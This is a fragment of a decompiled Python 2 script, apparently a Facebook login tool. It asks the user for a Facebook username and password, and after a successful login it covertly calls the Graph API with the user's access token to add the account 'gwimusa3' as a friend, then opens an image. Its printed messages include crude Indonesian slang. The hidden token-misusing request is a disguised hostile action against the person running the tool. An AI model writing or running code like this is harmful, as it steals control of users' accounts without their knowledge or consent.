#Decompiled by Deray Feat  Anjasmara 
...
br.addheaders = [('User-Agent', 'Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13F69 Safari/601.1')]
...
def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mNGE teh ASU \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)
...
def login():
    ...
    try:
        ...
        print '[~]LOGIN AKUN FACEBOOK DULU\x1b[1;91m[~]'
        id = raw_input('[+] Username : ')
        pwd = getpass.getpass('\x1b[1;91m[+] Password :\x1b[1;92m ')
        tik()
        try:
        ...
        if 'save-device' in url:
            try:
                ...
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mBAU MEMEKKKK'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://i.ytimg.com/vi/9CG97v5Y8tU/hqdefault.jpg ')
                time.sleep(2)
                menu()
